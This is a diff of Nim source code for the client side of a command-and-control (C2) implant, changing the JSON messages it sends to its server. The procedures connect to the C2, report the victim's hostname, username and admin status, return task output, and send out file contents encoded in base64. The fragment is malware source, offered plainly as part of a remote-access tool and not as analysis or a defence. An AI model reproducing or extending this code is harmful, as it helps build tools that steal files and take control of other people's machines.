@@ -3,37 +3,52 @@ import net, base64, json
 proc sendData(client: Socket, data: string) =
     client.send(encode(data) & "\r\n")
 
-proc sendOutput*(client: Socket, category: string, output: string) =
+proc sendOutput*(client: Socket, taskId: int, category: string, output: string, error: string = "") =
     let j = %*
         {
             "task": "output",
-            "category": category,
-            "output": encode(output)
+            "taskId": taskId,
+            "error": error,
+            "data": {
+                "category": category,
+                "output": encode(output)
+            }
         }
     client.sendData($j)
 
-proc identify*(client: Socket, hostname: string, isAdmin: bool, username: string) =
+proc identify*(client: Socket, taskId: int, hostname: string, isAdmin: bool, username: string) =
     let j = %*
         {
             "task": "identify",
-            "hostname": hostname,
-            "isAdmin": isAdmin,
-            "username": username
+            "taskId": taskId,
+            "error": "",
+            "data": {
+                "hostname": hostname,
+                "isAdmin": isAdmin,
+                "username": username
+            }
         }
     client.sendData($j)
 
 proc connectToC2*(client: Socket) =
     let j = %*
         {
-            "task": "connect"
+            "task": "connect",
+            "taskId": -1,
+            "error": "",
+            "data": {}
         }
     client.sendData($j)
 
-proc sendFile*(client: Socket, path: string, b64c: string) =
+proc sendFile*(client: Socket, taskId: int, path: string, b64c: string, error: string = "") =
     let j = %*
         {
             "task": "file",
-            "path": path,
-            "contents": b64c
+            "taskId": taskId,
+            "error": error,
+            "data": {
+                "path": path,
+                "contents": b64c
+            }
         }
     client.sendData($j)
